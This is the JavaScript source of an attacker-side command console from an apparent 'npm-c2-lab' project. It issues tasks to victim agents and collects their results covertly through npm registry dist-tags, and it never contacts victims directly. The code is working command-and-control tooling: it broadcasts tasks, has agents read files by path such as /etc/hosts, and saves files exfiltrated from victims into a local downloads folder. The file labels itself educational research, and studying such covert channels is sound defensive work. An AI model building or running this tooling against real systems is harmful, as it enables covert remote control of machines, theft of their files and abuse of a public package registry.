// Attacker CLI: interactive REPL that issues commands and collects results
// exclusively through npm dist-tags. It never talks to a victim directly.
//
// While the prompt is idle, a background poller keeps running and prints
// live notifications: agents discovered (announce tags) and tasks completing
// or failing (result tags).
//
// Commands:
//   agents                      list historically discovered agents
//   task <agentId|all> <op> [args...]   task one known agent or broadcast to all
//                         (op allowlist: src/common/ops.js)
//   history [n]                 show the last n requests/responses (default 20)
//   poll                        fetch results or show locally pending direct tasks
//   clean                       delete all lab tags (x-cmd-*/x-res-*/x-ann-*)
//   stats                       local counters: commands sent, results received
//   help                        show help
//   exit                        save state and quit

import readline from 'node:readline/promises';
import fs from 'node:fs';
import path from 'node:path';
import { styleText } from 'node:util';
import { pathToFileURL } from 'node:url';
import { taskTtlMs, loadConfig, configArgFromArgv } from '../common/config.js';
import { createLogger } from '../common/logger.js';
import {
  PINNED_VERSION,
  MAX_TAG_LEN,
  decodeAnnounceTag,
  decodeCommandTag,
  decodeResultTag,
  encodeCommandTag,
  isAnnounceTag,
  isCommandTag,
  isLabTag,
  isResultTag,
  reassembleResult,
} from '../common/protocol.js';
import { OP_DEFS, getOpDef } from '../common/ops.js';
import { RegistryClient } from '../common/registry.js';
import { saveState } from '../victim/agent.js';
import { assertKnownAgent, loadAttackerState } from './state.js';

const tty = process.stdout.isTTY;
const c = (color, s) => (tty ? styleText(color, s) : s);

// Readability palette (no emojis, no rainbow):
//   yellow bold  section headers        bold white   command/op names
//   cyan         CLI title              dim          secondary text
//   green        success / joins        red          errors
//   magenta      agent ids / results    blue         prompt / outgoing
const section = (s) => c(['bold', 'yellow'], s);
const cmdName = (s) => c(['bold', 'white'], s);
const dim = (s) => c('dim', s);

const HISTORY_MAX = 200; // persisted entries, capped so the state file stays small
const HISTORY_OUTPUT_MAX = 300; // chars of a result output kept in history
const REGISTRY_TEXT_MAX = 4_000;
const ANSI_CSI_RE = /\u001b\[[0-?]*[ -/]*[@-~]/g;
const TERMINAL_CONTROL_RE = /[\u0000-\u001f\u007f-\u009f]/g;

function ts() {
  return new Date().toTimeString().slice(0, 8);
}

function pushHistory(state, entry) {
  state.history.push(entry);
  if (state.history.length > HISTORY_MAX) {
    state.history.splice(0, state.history.length - HISTORY_MAX);
  }
}

/** Direct requests without a matching locally recorded response. */
export function pendingDirectTasks(history, { now = Date.now(), ttlMs = Infinity } = {}) {
  const completed = new Set(
    history
      .filter((entry) => entry.dir === 'in')
      .map((entry) => `${entry.agentId}:${entry.seq}:${entry.op}`),
  );
  return history.filter(
    (entry) =>
      entry.dir === 'out' &&
      entry.target !== 'all' &&
      now - entry.ts < ttlMs &&
      !completed.has(`${entry.target}:${entry.seq}:${entry.op}`),
  );
}

/** Render registry-controlled text without terminal escapes or unbounded output. */
export function sanitizeRegistryText(value, maxLength = REGISTRY_TEXT_MAX) {
  const text = typeof value === 'string' ? value : String(value ?? '');
  return text
    .replace(ANSI_CSI_RE, '')
    .replace(TERMINAL_CONTROL_RE, (character) => {
      if (character === '\n') return '\\n';
      if (character === '\t') return '\\t';
      return '';
    })
    .slice(0, maxLength);
}

/** Coalesce concurrent refresh callers onto the same in-flight promise. */
export function createSingleFlight(fn) {
  let inFlight = null;
  return (...args) => {
    if (inFlight) return inFlight;
    let result;
    try {
      result = fn(...args);
    } catch (err) {
      result = Promise.reject(err);
    }
    const shared = Promise.resolve(result).finally(() => {
      if (inFlight === shared) inFlight = null;
    });
    inFlight = shared;
    return shared;
  };
}

export function formatLiveNotification(line, clearPrompt) {
  return clearPrompt ? `\r\x1b[2K${line}` : line;
}

// ---------------------------------------------------------------------------

function parseTaskLine(line) {
  const tokens = line.trim().split(/\s+/);
  const [, target, op, ...rest] = tokens;
  if (!target || !op) {
    throw new Error('usage: task <agentId|all> <op> [args...]');
  }
  const def = getOpDef(op);
  if (!def) {
    throw new Error(`unknown op "${op}" — allowed: ${OP_DEFS.map((o) => o.name).join(', ')}`);
  }
  const pathHint =
    '\n  path is absolute (e.g. /etc/hosts) or relative to the agent\'s cwd (see pwd/cd)';
  const args = {};
  switch (def.argSpec) {
    case 'none':
      if (rest.length > 0) throw new Error(`op "${op}" takes no arguments`);
      break;
    case 'text':
      args.text = rest.join(' ');
      break;
    case 'text!':
      args.text = rest.join(' ');
      if (!args.text) throw new Error(`usage: task <agentId|all> ${def.usage}`);
      break;
    case 'url': {
      args.url = rest.join(' ');
      let parsed;
      try {
        parsed = new URL(args.url);
      } catch {
        throw new Error(`usage: task <agentId|all> ${def.usage} (http(s):// only)`);
      }
      if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
        throw new Error('openurl accepts http(s):// URLs only');
      }
      break;
    }
    case 'volume':
      args.level = Number(rest[0]);
      if (rest.length !== 1 || !Number.isInteger(args.level) || args.level < 0 || args.level > 100) {
        throw new Error(`usage: task <agentId|all> ${def.usage}`);
      }
      break;
    case 'path':
      args.path = rest.join(' ');
      if (!args.path) throw new Error(`usage: task <agentId|all> ${def.usage}${pathHint}`);
      break;
    case 'path?':
      if (rest.length > 0) args.path = rest.join(' ');
      break;
    case 'path+query':
      [args.path] = rest;
      args.query = rest.slice(1).join(' ');
      if (!args.path || !args.query) {
        throw new Error(`usage: task <agentId|all> ${def.usage}${pathHint}`);
      }
      break;
  }
  return { target, op, args };
}

function sanitizeFilename(name) {
  return path.basename(String(name)).replace(/[^A-Za-z0-9._-]/g, '_') || 'file.bin';
}

/** Save a transferred file from a result payload to downloads/. */
function saveDownload(agentId, r) {
  const dir = path.resolve('downloads');
  fs.mkdirSync(dir, { recursive: true });
  if (!Number.isSafeInteger(r.seq) || r.seq < 1) {
    throw new Error('missing or invalid result sequence');
  }
  const out = path.join(dir, `${agentId}-seq${r.seq}-${sanitizeFilename(r.file.name)}`);
  if (path.dirname(out) !== dir) {
    throw new Error('resolved download path escapes downloads/');
  }
  if (!Number.isSafeInteger(r.file.size) || r.file.size < 0) {
    throw new Error('missing or invalid file size');
  }
  if (typeof r.file.dataB64 !== 'string' || !/^[A-Za-z0-9+/]*={0,2}$/.test(r.file.dataB64)) {
    throw new Error('file payload is not valid base64');
  }
  const data = Buffer.from(r.file.dataB64, 'base64');
  if (data.length !== r.file.size) {
    throw new Error(`decoded size mismatch (${data.length} bytes, expected ${r.file.size})`);
  }
  fs.writeFileSync(out, data);
  return out;
}

function formatHistoryEntry(e) {
  const at = new Date(e.ts).toTimeString().slice(0, 8);
  if (e.dir === 'out') {
    const argStr = e.args && Object.keys(e.args).length > 0 ? ` ${JSON.stringify(e.args)}` : '';
    return `[${at}] ${c('blue', '->')} ${e.target} #${e.seq} ${e.op}${argStr}`;
  }
  const status = e.ok ? c('green', 'ok') : c('red', 'FAIL');
  const body = sanitizeRegistryText(e.ok ? e.output : e.error, HISTORY_OUTPUT_MAX);
  const op = sanitizeRegistryText(e.op ?? '?', 64);
  return `[${at}] ${c('magenta', '<-')} ${e.agentId} #${e.seq} ${op} ${status}: ${body}`;
}

async function main() {
  const cfg = loadConfig(configArgFromArgv());
  const logger = createLogger({
    level: process.env.NPM_C2_LOG_LEVEL || 'info',
    logFile: cfg.logFile,
    console: false, // keep REPL output clean; log lines go to the file only
  });
  const statePath = cfg.stateFile || 'attacker-state.json';
  const state = loadAttackerState(statePath);
  const save = () => saveState(statePath, state);
  const ttlMs = taskTtlMs(cfg.pollIntervalSec);

  const client = new RegistryClient({
    registryUrl: cfg.registryUrl,
    packageName: cfg.packageName,
    token: cfg.token,
    logger,
  });

  console.log(c(['bold', 'cyan'], 'npm-c2-lab attacker CLI (educational research only)'));
  console.log(`${dim('registry:')} ${cfg.registryUrl}  ${dim('package:')} ${cfg.packageName}`);
  if (!cfg.token) {
    console.log(c('yellow', 'warning: NPM_C2_TOKEN is not set — writes will fail with 401'));
  }
  console.log(`${dim('state:')}    ${statePath} ${dim(`(history: ${state.history.length} entries)`)}`);
  console.log(`type ${cmdName('help')} for commands`);

  // --- REPL (created before the poller so notifications can redraw the prompt)

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: c('blue', 'npm-c2> '),
  });

  /** Print a live notification without eating the line the user is typing. */
  function notify(line, redraw = true) {
    console.log(formatLiveNotification(line, redraw && tty));
    if (redraw && !rlClosed) rl.prompt(true);
  }

  // --- shared helpers -------------------------------------------------------

  function noteAgent(agentId, redraw = true) {
    if (state.agents.includes(agentId)) return;
    state.agents.push(agentId);
    notify(`[${ts()}] ${c('green', '[+] agent discovered:')} ${c('bold', agentId)}`, redraw);
  }

  function printResult(agentId, r, redraw = true) {
    const op = sanitizeRegistryText(r.op ?? '?', 64);
    const output = sanitizeRegistryText(r.output);
    const error = sanitizeRegistryText(r.error);
    const head = `[${ts()}] ${c('magenta', agentId)} #${r.seq} ${op}`;
    if (!r.ok) {
      notify(`${head} ${c('red', 'FAILED')}: ${error}`, redraw);
      return;
    }
    if (r.file && typeof r.file.dataB64 === 'string') {
      try {
        const out = saveDownload(agentId, r);
        notify(`${head} ${c('green', 'done')}: ${output} -> saved to ${c('bold', out)}`, redraw);
      } catch (err) {
        notify(`${head} ${c('red', 'error')}: received file but failed to save: ${err.message}`, redraw);
      }
      return;
    }
    notify(`${head} ${c('green', 'done')}: ${output}`, redraw);
  }

  function recordResult(agentId, r) {
    pushHistory(state, {
      dir: 'in',
      ts: Date.now(),
      agentId,
      seq: r.seq,
      op: sanitizeRegistryText(r.op ?? '?', 64),
      ok: r.ok,
      output: sanitizeRegistryText(r.output, HISTORY_OUTPUT_MAX),
      error: sanitizeRegistryText(r.error, HISTORY_OUTPUT_MAX),
    });
  }

  let cleaning = false;
  // First time each incomplete result group was observed, so a result whose
  // chunks were lost in transit stops nagging once the task TTL has passed.
  const incompleteFirstSeen = new Map();

  function printPendingTasks() {
    const pending = pendingDirectTasks(state.history, {
      now: Date.now(),
      ttlMs,
    });
    for (const task of pending.slice(-5)) {
      const ageSec = Math.max(0, Math.floor((Date.now() - task.ts) / 1000));
      console.log(c('yellow', `pending: ${task.target} #${task.seq} ${task.op} (${ageSec}s)`));
    }
  }

  const refreshOnce = createSingleFlight(async ({ redraw = false } = {}) => {
    if (cleaning) throw new Error('registry cleanup is in progress');
    const tags = await client.getDistTags();
    if (cleaning) return { fresh: 0, incomplete: [] };
    const observedAt = Date.now();
    const groups = new Map(); // "<agentId>:<seq>" -> parts[]
    for (const name of Object.keys(tags)) {
      if (isCommandTag(name)) {
        try {
          const cmd = decodeCommandTag(name);
          state.nextSeq[cmd.agentId] = Math.max(state.nextSeq[cmd.agentId] ?? 0, cmd.seq);
        } catch (err) {
          logger.warn(`skipping malformed command tag "${name}": ${err.message}`);
        }
        continue;
      }
      if (isAnnounceTag(name)) {
        try {
          const ann = decodeAnnounceTag(name);
          noteAgent(ann.agentId, redraw);
        } catch (err) {
          logger.warn(`skipping malformed announce tag "${name}": ${err.message}`);
        }
        continue;
      }
      if (!isResultTag(name)) continue;
      let part;
      try {
        part = decodeResultTag(name);
      } catch (err) {
        logger.warn(`skipping malformed result tag "${name}": ${err.message}`);
        continue;
      }
      const key = `${part.agentId}:${part.seq}`;
      if (!groups.has(key)) groups.set(key, []);
      groups.get(key).push(part);
    }
    let fresh = 0;
    const incomplete = [];
    for (const [key, parts] of groups) {
      if (state.seenResults.includes(key)) continue;
      const total = parts[0].total;
      if (new Set(parts.map((p) => p.chunk)).size !== total) {
        const firstSeen = incompleteFirstSeen.get(key) ?? observedAt;
        incompleteFirstSeen.set(key, firstSeen);
        const have = new Set(parts.map((p) => p.chunk)).size;
        if (observedAt - firstSeen >= ttlMs) {
          incomplete.push(`${key}: result incomplete (${have}/${total} chunks) after the task TTL — giving up, result lost`);
          state.seenResults.push(key);
          incompleteFirstSeen.delete(key);
          continue;
        }
        incomplete.push(`${key}: waiting for chunks (${have}/${total})`);
        continue;
      }
      incompleteFirstSeen.delete(key);
      try {
        const result = reassembleResult(parts);
        const a = parts[0].agentId;
        noteAgent(a, redraw);
        printResult(a, result, redraw);
        recordResult(a, result);
        state.seenResults.push(key);
        state.received++;
        state.perAgent[a] = (state.perAgent[a] ?? 0) + 1;
        fresh++;
      } catch (err) {
        logger.warn(`failed to reassemble ${key}: ${err.message}`);
      }
    }
    for (const key of incompleteFirstSeen.keys()) {
      if (!groups.has(key)) incompleteFirstSeen.delete(key);
    }
    save();
    return { fresh, incomplete };
  });

  async function pollOnce({ quiet = false, redraw = false } = {}) {
    const { fresh, incomplete } = await refreshOnce({ redraw });
    if (!quiet) {
      for (const message of incomplete) notify(c('yellow', message), redraw);
      console.log(fresh === 0 ? 'no new results' : `${fresh} new result(s)`);
      if (fresh === 0) printPendingTasks();
    }
    return fresh;
  }

  async function sendTask(target, op, args) {
    const seq = Math.max(0, ...Object.values(state.nextSeq)) + 1;
    const sentAt = Date.now();
    const payload = { op, args, ts: sentAt };
    const tag = encodeCommandTag(target, seq, payload);
    await client.setDistTag(tag, PINNED_VERSION);
    state.nextSeq[target] = seq;
    state.sent++;
    pushHistory(state, { dir: 'out', ts: sentAt, target, seq, op, args, tag });
    save();
    console.log(`[${ts()}] ${c('green', 'sent:')} task ${c('bold', `#${seq}`)} ${op} -> ${target} (tag ${tag.length}/${MAX_TAG_LEN} chars)`);
    console.log(c('dim', `  ${tag}`));
  }

  // --- help rendering -------------------------------------------------------

  /** Render "left  description" rows with aligned columns. */
  function table(rows, { indent = 2, pad = 4 } = {}) {
    const width = Math.max(...rows.map(([left]) => left.length));
    return rows
      .map(
        ([left, right]) =>
          ' '.repeat(indent) + cmdName(left) + ' '.repeat(width - left.length + pad) + dim(right),
      )
      .join('\n');
  }

  const commands = {
    help() {
      const commandRows = [
        ['task <agentId|all> <op> [args]', 'task one known agent or broadcast to all'],
        ['agents', 'list historically discovered agents'],
        ['history [n]', 'last n requests/responses (default 20)'],
        ['poll', 'fetch results or show locally pending direct tasks'],
        ['clean', 'delete all x-cmd-* / x-res-* / x-ann-* tags'],
        ['stats', 'local counters: sent, received, per-agent'],
        ['help', 'this help'],
        ['exit', 'save state and quit'],
      ];
      const opRows = OP_DEFS.filter((o) => o.group !== 'fun').map((o) => [o.usage, o.summary]);
      const funRows = OP_DEFS.filter((o) => o.group === 'fun').map((o) => [o.usage, o.summary]);
      console.log(
        [
          '',
          section('  COMMANDS'),
          table(commandRows),
          '',
          section(`  TASK OPS (${opRows.length})   ${dim('task <agentId|all> <op> [args]')}`),
          table(opRows),
          '',
          section(`  FUN OPS (${funRows.length})`),
          table(funRows),
          '',
          dim('  path args are absolute or relative to the agent cwd (see pwd/cd).'),
          dim('  agent discoveries and task results print as live notifications.'),
          '',
        ].join('\n'),
      );
    },

    async agents() {
      try {
        await pollOnce({ quiet: true }); // best-effort refresh
      } catch (err) {
        console.log(c('yellow', `registry refresh failed: ${err.message}`));
      }
      if (state.agents.length === 0) {
        console.log(dim('no agents seen yet'));
      } else {
        for (const a of state.agents) {
          console.log(
            `  ${c(['bold', 'green'], a)}  ${c('yellow', 'known')}, ${dim(`${state.perAgent[a] ?? 0} results`)}`,
          );
        }
      }
    },

    async task(line) {
      const { target, op, args } = parseTaskLine(line);
      try {
        await pollOnce({ quiet: true });
      } catch (err) {
        logger.warn(`agent discovery refresh failed before task: ${err.message}`);
      }

      if (target === 'all') {
        if (state.agents.length === 0) throw new Error('no known agents available; task not sent');
        await sendTask('all', op, args);
      } else {
        assertKnownAgent(state, target);
        await sendTask(target, op, args);
      }
    },

    async poll() {
      await pollOnce();
    },

    history(line) {
      const argStr = line.trim().split(/\s+/)[1];
      const n = argStr ? Number(argStr) : 20;
      if (!Number.isSafeInteger(n) || n <= 0) {
        console.log('usage: history [n]');
        return;
      }
      const entries = state.history.slice(-n);
      if (entries.length === 0) {
        console.log(dim('history is empty'));
        return;
      }
      console.log(dim(`last ${entries.length} of ${state.history.length} entries:`));
      for (const e of entries) console.log(formatHistoryEntry(e));
    },

    async clean() {
      cleaning = true;
      try {
        const tags = await client.getDistTags();
        const lab = Object.keys(tags).filter(isLabTag);
        if (lab.length === 0) {
          console.log('nothing to clean');
          return;
        }
        let deleted = 0;
        for (const tag of lab) {
          try {
            await client.deleteDistTag(tag);
            deleted++;
          } catch (err) {
            console.log(c('yellow', `failed to delete ${tag}: ${err.message}`));
          }
        }
        const remaining = Object.keys(await client.getDistTags());
        console.log(`deleted ${deleted}/${lab.length} lab tags; remaining: ${remaining.join(', ') || '(none)'}`);
      } finally {
        cleaning = false;
        save();
      }
    },

    stats() {
      console.log(`${dim('commands sent:')}    ${cmdName(String(state.sent))}`);
      console.log(`${dim('results received:')} ${cmdName(String(state.received))}`);
      console.log(`${dim('agents seen:')}      ${cmdName(String(state.agents.length))}`);
      for (const [a, n] of Object.entries(state.perAgent)) {
        console.log(`  ${c('magenta', a)}: ${n} results`);
      }
      console.log(`${dim('history entries:')}  ${state.history.length}`);
      console.log(`${dim('next seq:')}         ${JSON.stringify(state.nextSeq)}`);
    },
  };

  // --- background poller: live notifications while the prompt is idle -------

  const notifyIntervalSec = Math.min(cfg.pollIntervalSec, 5);
  let rlClosed = false;
  const timer = setInterval(async () => {
    if (rlClosed) return;
    try {
      await pollOnce({ quiet: true, redraw: true });
    } catch (err) {
      notify(c('yellow', `[${ts()}] background poll failed: ${err.message}`));
    }
  }, notifyIntervalSec * 1000);
  timer.unref?.();
  console.log(c('dim', `live notifications on (polling every ${notifyIntervalSec}s)`));

  // --- REPL loop ------------------------------------------------------------

  rl.prompt();

  async function handleLine(line) {
    const trimmed = line.trim();
    const cmd = trimmed.split(/\s+/)[0];
    try {
      if (trimmed === '') {
        // ignore
      } else if (cmd === 'exit' || cmd === 'quit') {
        save();
        rl.close();
        return;
      } else if (cmd === 'watch') {
        console.log('watch is gone — live notifications already poll in the background');
      } else if (commands[cmd]) {
        await commands[cmd](trimmed);
      } else {
        console.log(`unknown command "${cmd}" — type "help"`);
      }
    } catch (err) {
      console.log(c('red', `error: ${err.message}`));
      logger.error(`command "${cmd}" failed: ${err.message}`);
    }
    if (!rlClosed) rl.prompt();
  }

  // Serialize command handling so piped input cannot race (e.g. "exit"
  // killing the process before an earlier async command finishes printing).
  let queue = Promise.resolve();
  rl.on('line', (line) => {
    queue = queue.then(() => handleLine(line));
  });

  rl.on('close', () => {
    // Mark closed synchronously: piped input can fire 'close' while queued
    // async commands are still running, and they must not prompt a dead rl.
    rlClosed = true;
    queue.then(() => {
      clearInterval(timer);
      save();
      logger.close();
      console.log('bye');
      process.exit(0);
    });
  });
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  main().catch((err) => {
    console.error(`fatal: ${err.message}`);
    process.exit(1);
  });
}
